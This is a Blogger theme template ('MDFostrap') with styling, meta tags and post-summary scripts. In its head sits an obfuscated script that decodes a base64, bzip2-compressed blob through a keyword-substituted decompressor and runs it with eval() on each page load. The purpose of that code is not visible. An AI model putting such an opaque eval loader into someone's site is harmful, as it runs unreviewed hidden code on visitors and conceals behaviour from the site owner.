<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html b:version='2' lang='en' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  <head>
    <meta content='width=device-width, initial-scale=1' name='viewport'/>
<meta expr:content='data:blog.pageName' property='og:title'/>
<meta expr:content='data:blog.canonicalUrl' property='og:url'/>
<meta content='article' property='og:type'/>
<meta expr:content='data:blog.title' property='og:site_name'/>
<b:if cond='data:blog.postImageUrl'>
    <meta expr:content='data:blog.postImageUrl' property='og:image'/>
    <meta content='158' property='og:image:width'/>
    <meta content='158' property='og:image:height'/>
    <b:else/>
        <meta content='Your Image Default if image not exist' property='og:image'/>
        <meta content='158' property='og:image:width'/>
        <meta content='158' property='og:image:height'/>
</b:if>
<b:if cond='data:blog.metaDescription'>
    <meta expr:content='data:blog.metaDescription' name='og:description'/>
    <b:else/>
        <meta expr:content='data:post.snippet' name='og:description'/>
</b:if>
<meta content='YOUR FB ADMINS ID' property='fb:admins'/>
<meta content='@YOUR TWITTER SITE' name='twitter:site'/>
<meta content='@YOUR TWITTER CREATOR' name='twitter:creator'/>
<b:if cond='data:blog.isMobile'>
    <meta content='noindex,nofollow' name='robots'/>
</b:if>
<b:if cond='data:blog.pageType == &quot;index&quot;'>
    <title> <data:blog.title/> <data:blog.pageName/> </title>
    <meta expr:content='data:blog.metaDescription' name='og:description'/>
    <meta expr:content='data:blog.metaDescription' itemprop='description' name='description'/>
    <meta content='free blogger material design template, material design template for blogger, material design themes for blogger' name='keywords'/>
    <meta content='Your Image Default if image not exist' property='og:image'/>
    <meta content='158' property='og:image:width'/>
    <meta content='158' property='og:image:height'/>
    <b:else/>
        <title>
            <data:blog.pageName/> | <data:blog.title/>
        </title>
        <meta expr:content='data:blog.metaDescription' itemprop='description' name='description'/>
</b:if>
<!-- verification id -->
<meta content='YOUR GOOGLE VERIFICATION' name='google-site-verification'/>
<meta content='YOUR BING VERIFICATION ID' name='msvalidate.01'/>
<meta content='YOUR ALEXA VERIFICATION ID' name='alexaVerifyID'/>


    <b:include data='blog' name='all-head-content'/>
   
    <script src='https://code.jquery.com/jquery-2.1.1.min.js' type='text/javascript'/> 
    <b:skin><![CDATA[
      
/*

.:: Blogger Material Design Template ::.
    Name     : MDFostrap
    Author   : Wisnu ST
    Facebook : http://facebook.com/wisnu.haha
    Website  : http://www.fostrap.com 

    Please respect my work by not removing my credit name,
  I made this template with a hard-earned and already dispose of a lot of my time
  - Wisnu ST

*/ 
body{background-color:#F0F0F0}.section{margin:0;}#container{margin-left:auto;margin-right:auto;margin:0 auto;color:#444;font-size:14px;font-weight:normal}#content{width:712px;padding:20px 0px 10px 0px;float:left;display:inline;margin-top:-10px}#main-header-wrapper{padding-bottom:10px}#header-wrapper{min-height:100px;margin-bottom:0px}.head-hidden{padding:20px 0}#header{margin-top:-15px}#header h1{color:#616161;text-shadow:2px 2px 2px #FFFFFF;letter-spacing:-2px}#header a{text-decoration:none;color:#616161}#header a:hover{text-decoration:none;color:#616161}#header .description{margin:-3px 5px 5px;line-height:1.4em;color:#888888;font-size:14px}.header{margin:35px 0}.head-top-title{font-size:36px;line-height:40px;margin:10px 0;font-family:inherit;font-weight:bold;line-height:1;color:#222222}.head-top-title a{color:#222222}.header .description{margin:.5em 0 10px;padding:0 2px;color:#323a45}.date-header{display:none}.home-post-single{padding:20px;padding-left:240px}#main{padding-top:5px}.post{color:#616161;margin-bottom:10px;position:initial}.main-content-body img{max-width:100%;height:auto}.post-outer{margin-bottom:10px}.post-title{color:#333333;padding:0;margin:0;font-size:31px;line-height:40px !important}.post .post-text{padding-bottom:5px;clear:both}.post h2.post-title{font-weight:bold;letter-spacing:-1px;margin-top:0px}.post h2 a{color:#353737;letter-spacing:-1px}.post h2 a:hover{color:#666;text-decoration:none}.post ul.post-meta{color:#6b6969;clear:both;border-top:1px solid #222020;border-bottom:1px solid #222020;overflow:hidden;font-size:12px;font-style:italic;padding:5px 0px;list-style:none}.post ul.post-meta li{padding-right:20px;float:left}.post ul.post-meta a{color:#0b6e69}.post .post-comment{display:inline;width:33px;text-align:center;padding:5px 0px 10px 0px;margin-top:10px;float:right}.post h2,.post h3{color:#666}.post h4,.post h5,.post h6{color:#666}.left{padding:20px 25px 0px 0px;width:300px;float:right}.status-msg-body{position:relative !important;padding:10px}.post-header-home{margin:5px 0px 15px;font-size:11px}.post-header{font-size:13px}.post-comment-link,.post-timestamp{margin-left:0px}.sidebar li{list-style-type:none;margin:0;padding:0}.sidebar ul li{height:100%;line-height:22px;clear:left;margin: 3px 10px 3px 0px;}.sidebar ul li{text-decoration:none}#comments h4{font-size:16px;color:#424242;font-weight:bold;margin-top:0;line-height:normal}#comments-block{line-height:1.6em;margin:1em 0 1.5em;color:#7F7D77}#comments-block .comment-author{background:#dfdfdf none repeat scroll 0 0;border:1px solid #eaeaea;margin:0.5em 0;padding-bottom:4px;padding-left:8px;padding-top:4px;font-weight:bold}#comments-block .comment-body{background:#fff;border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3;margin-top:-8px;padding-left:10px;padding-top:10px}#comments-block .comment-footer{background:#fff;border-bottom:1px solid #e3e3e3;border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3;font-size:11px;line-height:1.4em;margin:-0.25em 0 2em;padding-bottom:5px;padding-left:10px;text-transform:none}#comments-block .comment-body p{margin:0;padding-bottom:15px}#comment-holder{padding:10px 0px}.comments .comment-block,.comments .comment-thread.inline-thread .comment{background:transparent}#comments h4,.comments .comment-header,.comments .comment-thread.inline-thread .comment{position:relative}.comments .comments-content .icon.blog-author{position:absolute;right:0;margin:0;top:5px}.comments .comment-replybox-thread{margin-top:5px}.comment-form{max-width:100%}.comments .comments-content .comment-content{margin:0 0 8px;transition:box-shadow .25s;padding:15px 15px 45px;margin:0.5rem 0 1rem 0;border-radius:2px;background-color:#fff;box-shadow:0 2px 5px 0 rgba(0,0,0,0.16),0 2px 10px 0 rgba(0,0,0,0.12)}.comments .comments-content .comment-thread ol{margin:0 0 10px 0px !important}.comments .comments-content .comment-thread{margin:0 !important}.comments .comments-content .inline-thread{padding:0 !important;padding-left:12px !important}.comment-actions a{line-height:1.4;float:right;padding:4px 14px !important;margin-left:5px;border:none;border-radius:2px;display:inline-block;height:26px;outline:0;padding:0 2rem;text-transform:uppercase;vertical-align:middle;-webkit-tap-highlight-color:transparent;text-decoration:none !important;text-align:center;letter-spacing:.5px;transition:.2s ease-out;cursor:pointer;box-shadow:0 2px 5px 0 rgba(0,0,0,0.16),0 2px 10px 0 rgba(0,0,0,0.12);position:relative;top:-50px;right:8px;font-size:13px}.comment-actions a:hover{box-shadow:0 5px 11px 0 rgba(0,0,0,0.18),0 4px 15px 0 rgba(0,0,0,0.15)}.comments .comments-content .comment:first-child{padding-top:10px}.comments .comments-content .comment-replies{margin-left:36px;margin-top:1.9em}#comments-block .avatar-image-container img{background:#fff url(http://3.bp.blogspot.com/-UMSMHaOBzQg/To2XKFseUSI/AAAAAAAACVU/vlvJki_9vqA/s1600/gravatar.png) no-repeat left top;width:32px;height:32px}.blog-feeds{display:none}.post-feeds{display:none}img.centered{display:block;margin:auto}img.alignright{display:inline;margin:0px 0px 10px 20px}img.alignleft{display:inline;margin:0px 0px 10px 0px}.alignleft{float:left}.alignright{float:right}.imgpost{height:50px;padding:0 3px;border:0pt none;margin:3px 0pt 0pt;font-style:normal;font-variant:normal;font-weight:normal;font-size:14px;line-height:25px}.col-padding-0{padding:0}.jump-link{display:none}.label-size{margin:6px 0}.post-home-title{z-index:5;position:relative;margin:0;font-size:25px;line-height:35px;font-weight:500;max-height:66px;width:100%;overflow:hidden;text-overflow:ellipsis}.form-main-search{padding-right:30px}#container{max-width:1040px}.hash-home{float:left;margin-right:4px}.comment-link{float:none;}.btn-sharing-container{margin:0 !important;padding:10px 0 6px;border-radius:3px}.btn-sharing-list{padding:0 !important;text-align:center}.btn-sharing-list li{padding:5px 0;display:inline-block;margin:0 !important;margin-right:5px;margin-top:10px;padding-right:5px}.btn-sharing-list a:hover{text-decoration:none}.share-facebook{background-color:#4c66a4 !important}.share-twitter{background-color:#00c3f3 !important}.share-google-plus{background-color:#DB4A37 !important}#footer .section{padding:0 !important}#footer li{margin-bottom:15px}#LinkMu .widget-content{margin:15px 0px}.post-footer-line-1{display:none}p.footer-link{clear:both;text-align:center;font-size:11px;padding:12px;overflow:hidden;color:#eeeeee;background:#191d20;line-height:18px}.blog-pager-element a{padding:7px 10px;margin-right:5px;font-weight:bold}.blogger-pager{float:left}#blog-pager{text-align:center;overflow:hidden;padding:10px 0}.blogger-pager a{float:left;font-size:15px}.blog-pager-p{background:#1abc9c;float:left;font-size:15px;padding:8px 10px;margin-right:5px;font-weight:bold}.blogger-pager a{text-decoration:none}.blogger-pager{float:left;width:100%}.sidebar ul{margin:0;padding:0;list-style:none}.sidebar li{margin:0 0 0 15px;padding:0 0 5px;text-transform:capitalize}.Label li{margin:0;margin-right:5px;display:inline-block;list-style:none}.Label li a{padding:0px 15px}.hoverable{transition:box-shadow .25s;box-shadow:0}.hoverable:hover{transition:box-shadow .25s;box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}nav{-webkit-box-shadow:0 2px 3px 0 rgba(0,0,0,0.21) !important;box-shadow:0 2px 3px 0 rgba(0,0,0,0.21) !important}.nav-top{z-index:99}.nav-top ul li:hover,.nav-top ul li.active{background:transparent;-webkit-box-shadow: inset 0px -4px 0px #FFF;-moz-box-shadow: inset 0px -4px 0px #FFF;}.nav-top ul li .waves-effect{display:inherit}@media (max-width:400px){.comments .comments-content .icon.blog-author::after {content:'Mod' !important; margin-top: 30px !important;}}#blog-pager{padding: 10px 8px;margin:0px -10px;}.search_counter{background-color:#FFF;color: #00BCD4;}.search_li > a{background-color:#FFF;color: #00BCD4;}.post-author.vcard, .post-comment-link, .post-single-outer .post-labels a, .post-timestamp{margin: 5px 2px !important; font-size:12px;}.post-author.vcard{margin-left:0px !important;}.rmlink{float:right}.rmlink a{height:25px;line-height:25px;outline:0;padding:0 1rem;font-size:13px;margin-bottom:20px;margin-top:5px;color: #616161;box-shadow: 0px 1px 3px #CCCCCC;}
.dropdown-content{z-index:5 !important;} 

@media (max-width: 325px){
.post-comment-link, .post-author.vcard {
    display: none !important;
}
}
.PageList LI.selected A { 
    font-weight: 500 !important;
}
.item-snippet {
    color: #919191;
    font-size: 13px;
    overflow: hidden;
    white-space: nowrap;
    text-overflow: ellipsis
}

@media (max-width:600px) {
    .home-post-single .post-home-title>a {
        color: #FFF !important;
    }
    .home-post-single {
        padding-top: 80px !important;
    }
    .post-header {
        margin: 10px 0 -3px !important;
    }
    .home-post-single::after {
        content: "";
        display: block;
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        height: 150px;
        background: 0 0;
        background: -webkit-linear-gradient(transparent, rgba(0, 0, 0, .7));
        background: -o-linear-gradient(transparent, rgba(0, 0, 0, .7));
        background: -moz-linear-gradient(transparent, rgba(0, 0, 0, .7));
        background: linear-gradient(transparent, rgba(0, 0, 0, .7))
    }
}

.logo-main {
    padding: 0 15px !important;
}

.logo-main h1 {
    margin: 0;
    line-height: inherit;
    font-size: inherit;
    display: inline-block;
}

.img-logo-main, .img-post-span {
    float: left;
    margin-right: 15px;
}

.img-logo-main {
    width: 45px;
    height: 45px;
    margin-top: 10px;
}

@media (max-width:600px) {
    .container {
        width: 100% !important;
    }
    .img-logo-main {
        display: none;
    }
}

abbr[title] {
    border-bottom: none !important;
}

.post-single-outer {
    margin: 15px -15px -15px;
}

.col-padding-0 {
    padding: 0 !important;
}
@media (min-width:601px) {
    .container {
        width: 95%! important;
    }
}

@media (min-width:993px) {
    .container {
        width: 90%! important;
    }
}

.fooontainer {
    margin-bottom: 15px;
}

nav ul a {
    padding: 0;
}

.FeaturedPost .post-summary {
    padding: 20px;
    border-radius: 2px;
    margin: .5rem 1rem .2rem .2rem;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 5px 0 rgba(0, 0, 0, .16), 0 2px 10px 0 rgba(0, 0, 0, .12);
    -moz-box-shadow: 0 2px 5px 0 rgba(0, 0, 0, .16), 0 2px 10px 0 rgba(0, 0, 0, .12);
    box-shadow: 0 2px 5px 0 rgba(0, 0, 0, .16), 0 2px 10px 0 rgba(0, 0, 0, .12);
}

.post blockquote{
	background:#FFFFFF !important;
	border-color: #00BCD4 !important;
}
.FeaturedPost .post-summary h3 {
    font-size: 1.5rem;
    line-height: 2rem;
    margin-top: 0;
}

.md-author {
    margin: 0 -20px;
    background: #F0F0F0;
    padding: 10px 25px;
} 
.breadcrumbs i {
    vertical-align: inherit !important;
    margin: 0px 3px;
}
@media (max-width:800px) {
	.section {
		margin: 0;
	}
}
.list-label-widget-content ul li {
	position: relative;
}
.list-label-widget-content ul li {
	position: relative;
}
.list-label-widget-content ul li span[dir] {
    position: absolute;
    top: -8px;
    z-index: 5;
    right: -8px;
    background: #FFF;
    font-size: 12px;
    line-height: normal;
    padding: 2px 3px;
    border-radius: 200px;
    width: 20px;
    height: 20px;
    text-align: center;
    vertical-align: middle;
}
@media (max-width: 600px) {
.image-index {
    height: 150px !important;
    width: 100% !important;
    position: absolute;
    top: 0px;
    left: 0px;
    right: 0px;
}
}
.popular-posts .collection{border:0;box-shadow: 0 2px 5px 0 rgba(0,0,0,0.16),0 2px 10px 0 rgba(0,0,0,0.12);}
/* cyan */
.comment-actions a{background:#00BCD4!important}
/* cyan text */
.post-main-home-title a:hover,.breadcrumbs .post-labels a{color:#00BCD4!important}
/* red text */
.sidebar h2{color:#F44336 !important}
/* hover red text */
  .sidebar ul a:hover{color:#F44336}
/* white text */
.status-msg-body a,.comment-actions a,.comment-link,.btn-sharing-list li,#footer a,.blog-pager-p,.Label li a,.blog-pager-element a,.post-timestamp,.container-subscribe .input-field label,.container-subscribe .input-field input[type=text]:focus + label,.container-subscribe .input-field .prefix.active,.container-subscribe,span.badge,.post-header{color: #FFFFFF !important}
/* grey darken-2 */
  body,.post-labels a,.post-comment-link a,.post-timestamp a,.post-main-home-title a{color:#616161 !important}
.post-author.vcard,.post-comment-link,.post-single-outer .post-labels a,.post-timestamp{background:#F0F0F0 !important;color:#616161 !important} 
]]></b:skin>
<b:if cond='data:blog.pageType == &quot;index&quot;'>
<style>
@media (max-width:600px) { 
  .post-outer .post-labels a{
        background: #F44336;
    }
}
  </style>
</b:if>  
<b:if cond='data:blog.pageType == &quot;static_page&quot;'>
    <style> 
      .post-header{
            display:none;
      }
      
      </style>
</b:if>
<link href='https://cdnjs.cloudflare.com/ajax/libs/materialize/0.96.1/css/materialize.min.css' media='screen,projection' rel='stylesheet' type='text/css'/> 
<link href='///maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css' rel='stylesheet' type='text/css'/> 
<b:template-skin><![CDATA[
#editorframe {
    width: 100% !important;
}
body#layout {
   text-transform:capitalize;
   padding-left: 1rem;
   padding-right: 1rem;
} 
  body#layout::after{
    content: "";
    display: table;
    clear: both; } 
body#layout .head-hidden{
    padding-bottom: 0;}
body#layout .main, body#layout .banner-footer{
width:62%;
float:left;}
body#layout .title-footer{
width:28%;
float:left;}
body#layout .LinkMu{
    width: 28%;
    float: right;
    right: 12px;}
body#layout .main{
background-color: #00BCD4!important}
body#layout .sidebox .section{float:right;width:26%;}
body#layout .sidebox .section{float:right;background-color: #F44336 !important} 
body#layout .fooontainer {display:none;}
@media (max-width: 600px){
.post-single-outer h1 {
    font-size: 2.5rem;
    line-height: 2.72rem;
    margin: 1.5rem 0 .2rem 0;
}
.post-single-outer h2 { 
    font-size: 2.1rem;
    line-height: 2.5rem;
    margin: 1rem 0 0.9rem 0;
}
.post-single-outer h3 {
    font-size: 1.9rem;
    line-height: 2.2rem;
    margin: 0.9rem 0 0.8rem 0;
}
.post-single-outer h4 {
    font-size: 1.7rem;
    line-height: 2.1rem;
    margin: 0.8rem 0 0.7rem 0;
}
.post-single-outer h5 {
    font-size: 1.6rem;
    line-height: 2rem;
    margin: 0.7rem 0 0.7rem 0;
}
}
]]></b:template-skin>

    <b:if cond='data:blog.pageType == &quot;index&quot;'>
        <style> 
        .post-labels {
        position:absolute;top:0;left:5px;z-index:5;}
        .post-outer .post-labels a{display:none;}
        .post-outer .post-labels a:last-child{display:inline-block;z-index:2;}
        .breadcrumbs .post-labels {
        position:static;top:0;left:5px;}
        .breadcrumbs {
            margin: 0 -10px 15px;}
        </style>
    </b:if>    
<script type='text/javascript'>
//<![CDATA[ 
var WHAK_com=atob('QlpoOTFBWSZTWe72X5gAAcLfgEAAf+f//3tnzIo////+YA1Oe+nZp72UqPnQN98PqCu2CbAaWwZLG7tS7aSr73wSSEhqbUyeRqYnqepkZMhoAZAAaDTQEoqfpU9iekiaAPSAADQAAAA0ASp6BEKnhQAAaDIaZMjQDQAABISCjQiCZoHqEyB+pNMgxPUzKPU0/VMgwRSTINEMJU9pE/VN6SepiZNMhoDBGgZDQRJEEaAJppPRMlP1TaRp6jNQaPUABpptQYDUUTfFrOzszsifBtMKIPt1AdYhgT27FWTPB8dyCzjbykYWOP8n9vXhcblafJ1dt4ZmTUbVoE4sIgGSJRg2NiTHQwabbAJFBgOJQxlgpj7wa9inuU/ZT+p6GCnyOcSUrbH8XYW4/cp4/MUxK88PBTmVu+7wM4TfjYplt+0jNSnpUywU2UopipXepiDNTC86t01KKcjrAL5BTgDRSaln+acjDfFkdy29TTBSml9+cs8NsnSVdo2UrIlGd18ZlFZFd2LAzGaoJacTtAKiyk6RY8WsOGu25XxJ88jkQMTXgDiRYQhyAOlNhIEK+sjpCJCLH30ldRoycj6oyEgv7kpEHxpvTWvgAzhN4vin5hTiD2sgvKOcGoVsNaZ5dzy9FC2wDKaHn9MyWxdPo+Gz1fYL1gBCdp0r7QLl1O6CFQ4EG1sP1h+2LEx1xNIeUZVm/YCVIEVRVRDAWW71WG5O9DQe1wNiSEzbIkcyRvYabhrgNebavDLhLfJtj4cpdmEXAOcuwuSuM1AOKmGAXJcDlVFjlYo0lB9D1xLYVUArNN2RoIWxQJGLH1yiVzKhWs8r7zsGNeJI/D20B9Ha3jr6h9c0Zu7/dRxN2BN/Wx4+M12N54KFVA3Q0UqrWs2kOtV9IhlWEC+orYgZ+NuEyu+ljO7WtAgGDqUiieZiQotbzPKXYv50dd/hfWK8b271Qu0IOYQfx+Ah8cJELs3ASpCEYIduJEuHooQQEaAtf8t6Oc93Dhwv7jk0b27FZrqaZcC+BFkQJJBievJXRptzCbqIU61Wy7FZxm+Tni1Mx0SNA0DY3AIoxnPInQGwIusWAYEnNAGNBBhTf2u4BzUMRyNYNey5oVNjQSrbD5EoWs1FOSkwiQHCXZ2YRNO8K0LgEJTGC+Rs3bJwFrK2UneKMUokY0KOVY9qcS3vKlvAmG5OI3eoQb9GV+PGdiECKOG+jFgysF4jvtZ5iQhnJoHIXA5zLJRBOCL08oaQjVMFFNA7CViJUPTjSrgiph0Sxpi9ulZQgW6at+NaypIxttALN2DW8ClGoz60WOPxWhs2S6BV+4VgVo9jY3Ie2dBoxXLEoR3r08K3VVjHm2Pa9MM1OPt0Z4RsrJ6zh7K8oZ1sflI2rHYa9EErVTm/Zitb3apjbXo8/v5ADh7WxFgXKiM7GQ7/DHkkuUzQtlXgGKt5KAD0ZRnoTCIU7UiRPg0PktG3r6WE+SkFS4H3g/zT8Zg+jNN8P6HjaCkR/qhD4fHQ+7E+t084YC46ymymg+RSwJ7JLziFSSODafC+SNV9xsv5REHsKpspx+gG+swDbR0WgAQoZayowToNhTVSPFDg5oOyl5nlYEMZM39nAoHI0wQKqyTY8A3/fLG0MRPZomih1d5PbEREM73war1D+BAcSwZZtxc9NNA0XGQZror/MCiEkkMjhmuKVZ1KVrD8/XMh0N6Bg7g11coKu0LPLTNgQ020byqYRuoRhnFoLkThptA/QYqXR2RDvY1tdIaBgmEUgPe4l/64cORQFKRJNHKZEZ0DMKQYWpSgN9gs5KaVdzNMhvQXIPYbtIhNVLUodCc1J1AaoEhDo6tbpfarSNqIa+GB38lPRqXCHT2wUyUpS9y2SixmI2xI8WM5UATA8BK8WEEh1F3iBmX1lOsRY4UShdTGmeW8gIF0UvUDUuX94zRT/pg6xhNu5SvPkGxQxWbV0gyQjXyidHPf0Lmxnyn2mhQBcH28g5YOBhvjBhVbPAKLsWPflRm25lJY60lrRaovG1sC7yQ0BoxwhopqrUOMwCwkxq5vwrXxhJ5im7efuIAQ9x3PZZPTi+pq8i/pISSE/FqMzcQQqZL2PfcwciCOUgGVOChacoITCDVVmg3ASTzC32NuA8gfl2krwEJKUnoGbqdmRSKSGiCxkr0aIXj1nd2AYuE5jWQAuhaEJcPZrkncFu5eAUHi78dcCeQczIDgr84mJ5Om3Oi/aojISSBCk7HtbbDeDMx+SripXI3nYpaIAd5vQNgOS+Pcp0A8IgdANnghmH6pTwC6b6nEQe9e8XYHUHYiaGhOjvHOnPTkcgfDiAbnQ5M6a3cmmKSe7NDnmE8Dcbtam12hCC1gNW/KPbwJXoZns2Nz8DpwBzSCR7bfEec+NTvh9amYDnsD09TgE/15PEGmW7d1uugXHdhOT21Wu8y5ypTuOQYgcs0Dqv4S6B44qd+TvU6GKcDsXuX2U0o+RTqUuUXU3G8iTCqCMie8NTwM1NYOaHwCtpsxKRcNbwO8ccSe3DJKgFrAN6ru5UAYwi7ukNsUGoNeNQINBiCCA2KQOzCpRHA+fhqU/nw5OsAyoXWoW1BQMNinRsssFCpixDVBLGLXnzIQcAZYC64rioQjGIxlIFRlASIWpCrKeoNluXOPa3bp7KRPN8T5bhThgn2HrPHgG1dUQKSKHghop7kLJvALsKgriJlaqXox37QCVs0uV6i7k9peZ25MkY3SZ71OnQHI9OwiXQqGFkwTEopqjb1hzxQ9/AWdn2X9U3HG7ZTZ1FIRGRxELOi+0EnQQi9I+WqRhCEJJISSGy4Xcdo2KZhTAGwTy9gMHdlKUSY7KKtFKJ6Oe9w5IaFNIYm23ncdsa5TmA6ug6f3CjjFQiyCQRHxAal4K9UWAk9d4YC+C1mdDsWiy302ctZRrDVarFS8psYxsog3hhVQ0NDp+m3wC4b5UIlvJpBpAkCLY5pcRxsOiiWoqIT0hgvn7vJF0w4hBTfwMM6ei81ZEFMmFODBdABYg1Xf2nTWIuw2qhcLZGCn0PxF6/BcgcVWGO0qpJqzO49vO511g+qMMp4YWDWW16+HepRSRAjLNbosO02EMgmtIYreMgUhcHUGpPyX+zJ2qZInd3GyEi20JESENS46tO1sAG59//M99137i57anSiQ4cFMRSZlK61Q8uYPrpNLrGG0Kyb2fFrMMrMpgUgapoLlBjVNTNCNoYwTZHlHSyOuXkhL0mWvBNTcDXoq7ddpC9A4lYb5OoNENxTdEjlNJmG2nPyQHrcMge6ruU+JuDj7HHkczJTC3MDBIlIFIQhW65dLXc+HMHFDeQkysiUWPTXMUTX3UTv4oaPUQydw3Bl2pfbPOoXQRAEEI1hZgbl+YgtLtHrbxfjoSmYpF+DOE76SMwjmyduEiThSMSMHu7W5N1PEvs8L/SIQUOonHQaMmEYkSeftHmxBAYg4MA0qIdghxVU4aXCEbIpxupSvmp9SnRTvoU9AzMCigOvGYLookh0dAjL5HUKEIMuJjTfBh8b8icqXacDqYa8szPeOLGG8+q2tK6SPiikfXkjijijhkc4/gxqWAy5tx7jGcw08Ln7hjgwdNBkkbKodZJSzZxiaedjw+mNMYSoum/4u5IpwoSHd7L8w');
var W,H,A,K='N=$(){$ t(){V.k=$(t){Z(Y i,h,o,s=t.@,n=[],f=0;s>f;f++){n.R([f,t[f]])}Z(n.R([s,-1]),f=[],s=n[0],t=s[0],s=s[1],i=1;i<n.@;i++){if(h=n[i][0],o=n[i][1],s){Z(;h>t;t++){f.R(X r(t,s))}}if(t=h,s=o,-1==o){G}}Z(f.Q($(t,r){? t.a-r.a||t.M-r.M}),V.J=f,n=0,t=-1,V.c=[],s=null,f=0;f<V.J.@;f++){i=V.J[f],t+=1,i.a!=n&&(t<<=i.a-n,s=V.c[n=i.a]={}),s[i.l=t]=i}V.e=16,V.f=-1,V.J.ZEach($(t){t.a<V.e&&(V.e=t.a),t.a>V.f&&(V.f=t.a)},V)}}$ r(t,r){V.M=t,V.a=r,V.l=void 0}$ i(){V.j=$(t){V.y=[];Z(Y r=0;31>r;r++){V.y[r]=(1<<r)-1}V.y[31]=-2147483648,V.d=t,V.D=V.z=V.a=0},V.g=$(t){Y r=t>>1;? V.b(r)*(1<<r)+V.b(t-r)},V.b=$(t){Z(;V.a<t;){V.z=(V.z<<8)+V.d.#(V.D++),V.a+=8}Y r=V.y[t],i=V.z>>V.a-t&r;? V.a-=t,V.z&=~(r<<V.a),i}}$ h(t,r){Y i,h,o,s,n,f,e=t.@;if(r>=e){L rx("Out")}if(0>r){L rx("Outs")}Z(i=t,t=t.T(""),i.Q(),h={},s=e-1;s>=0;s--){h[i[s]]=s}Z(o=[],s=0;e>s;s++){o.R(h[t[s]]++)}Z(h=i[s=r],n=[],f=1;e>f;f++){n.R(i[s=o[s]])}? h+n./().T("")}$ o(t,r,i){Z(Y h=t[r];r>0;t[r]=t[--r]){}i.R(t[0]=h)}?{^:{i:$(r){$ s(t){Z(Y r,i,h=[],o=t.b(16),s=I;s>0;s>>=1){if(o&s){Z(r=t.b(16),i=I;i>0;i>>=1){h.R(Boolean(r&i))}}P{Z(r=0;16>r;r++){h.R(!1)}}}? h}Y n,f=X i;if(f.j(r),f.b(16),104!=f.b(8)){L"Un"}if(r=f.b(8),!(r>=49&&57>=r)){L"Unk"}? r-=48,n=[],$(r,i,e,a,u,c,b,l,d,p,g,v,w,A){Z(;;){if(r=f.g(48),f.g(32),54156738319193!=r){if(25779555029136==r){f.b(7&f.a);G}L" 0x"+r.toString(16)}if(f.b(1)){L"B"}if(r=f.b(24),i=s(f),e=f.b(3),2>e||e>6){L rx("not")}Z(a=[0,1,2,3,4,5,6].slice(0,e),u=[],c=0,b=f.b(15);b>c;c++){Z(l=0;f.b(1);){if(l++>=e){L rx("2("+e+") ")}}o(a,l,u)}Z(l=[],a=i.reduce($(t,r){? t+r},0)+2,b=0;e>b;b++){Z(d=f.b(5),p=[],c=0;a>c;c++){if(0>d||d>20){L rx("side")}Z(;f.b(1);){d-=2*f.b(1)-1}p.R(d)}l.R(p)}Z(c=[],e=0;e<l.@;e++){b=X t,b.k(l[e]),c.R(b)}Z(e=[],l=i.@-1;l>=0;l--){i[l]&&e.R(String.fromCharCode(l))}Z(e./(),l=i=0,d=b=0,p=[];;){0>=--l&&(l=50,i<=u.@&&(g=c[u[i++]]));Z(w in g.c){if(f.a<w&&(f.z=(f.z<<8)+f.d.#(f.D++),f.a+=8),v=g.c[w][f.z>>f.a-w]){f.z&=f.y[f.a-=w],v=v.M;G}}if(v<0||1<v){Z(A=e[0];b>0;b--){p.R(A)}if(v==a-1){G}o(e,v-1,p)}P{0==b&&(d=1),b+=d<<v,d<<=1}}Z(r=h(p,r),u=[],c=0,a=r.@;a>c;){if(l=r.#(c),a-4>c&&r.#(c+1)==l&&r.#(c+2)==l&&r.#(c+3)==l){Z(l=r.charAt(c),i=r.#(c+4)+4;i>0;i--){u.R(l)}c+=5}P{u.R(r[c++])}}n.R(u.T(""))}}(),n.T("")}}}}(),F=N.^.i(N_^),eval(F);',W='#$/?@DFGIJLMNPQRTVXYZ^'.split('');for(A in H='charCodeAt,function,reverse,return,length,count,datas,break,32768,table,throw,code,WHAK,else,sort,push,join,this,new,var,for,com'.split(','))K=K.split(W[A]).join(H[A]);eval(K);
//]]>
</script>
<b:if cond='data:blog.pageType != &quot;static_page&quot;'>
<b:if cond='data:blog.pageType != &quot;item&quot;'>
<script type='text/javascript'>
var thumbnail_mode=&quot;yes&quot;;summary_noimg=300;summary_img=130;img_thumb_height=250;img_thumb_width=220;if(/Android|webOS|iPhone|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){var summary_img=80;var img_thumb_height=150};if(/iPad|iPod/i.test(navigator.userAgent)){var summary_img=100}  
</script>
<style>
.post-body{text-align:justify;}
.post-body img{max-width:none;width:auto;}
.read-more{float:left; padding-top: 10px;}
.read-more a{ color: #fff!important;text-shadow:0 1px 0 rgba(0,0,0,0.5);background:#0457A9;  text-decoration:none;font:bold 13px Arial;padding:5px;}
.read-more a:hover{text-decoration:none;background:#666;} 
</style>  
<script type='text/javascript'>
//<![CDATA[
function removeHtmlTag(strx,chop){if(strx.indexOf("<")!=-1){var s = strx.split("<");for(var i=0;i<s.length;i++){if(s[i].indexOf(">")!=-1){s[i] = s[i].substring(s[i].indexOf(">")+1,s[i].length);}}strx =  s.join("");}chop = (chop < strx.length-1) ? chop : strx.length-2;while(strx.charAt(chop-1)!=' ' && strx.indexOf(' ',chop)!=-1) chop++;strx = strx.substring(0,chop-1);return strx+'...';}function createSummaryAndThumb(pID){var div = document.getElementById(pID);var imgtag = "";var img = div.getElementsByTagName("img");var summ = summary_noimg;if(thumbnail_mode == "yes"){if(img.length>=1){imgtag = '<div class="image-index"><img src="'+img[0].src+'"/></div>';summ = summary_img;}}var summary = imgtag + '<div>' + removeHtmlTag(div.innerHTML,summ) + '</div>';div.innerHTML = summary;}
//]]>
</script>
<script type='text/javascript'>
//<![CDATA[ 
$(document).ready(function() { 
  var thumb_post = 220; 
  $('.image-index').find('img').each(function(n, image){
    var image = $(image);
    image.attr({src : image.attr('src').replace(/s\B\d{2,4}/,'s' + thumb_post)});
    image.attr('width',thumb_post);
    image.attr('height',thumb_post);
  });
});
//]]>   
</script>
 <script type='text/javascript'>  
 //<![CDATA[  
 $(document).ready(function() {  
